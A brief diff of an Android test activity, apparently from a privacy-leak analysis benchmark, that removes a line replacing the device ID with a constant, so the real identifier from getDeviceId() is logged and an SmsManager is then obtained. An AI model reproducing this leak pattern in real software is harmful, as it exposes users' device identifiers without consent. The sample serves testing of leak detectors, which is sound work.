@@ -48,7 +48,6 @@ public class Activity1 extends HelperActivity
 
     @SuppressWarnings("UnusedAssignment") 
     String leakedData = tmgr.getDeviceId();
-    leakedData = "DEV-ID765";
     Log.i("A6SOSI", "leak dev. id: "+leakedData);
     
     SmsManager manager = SmsManager.getDefault();
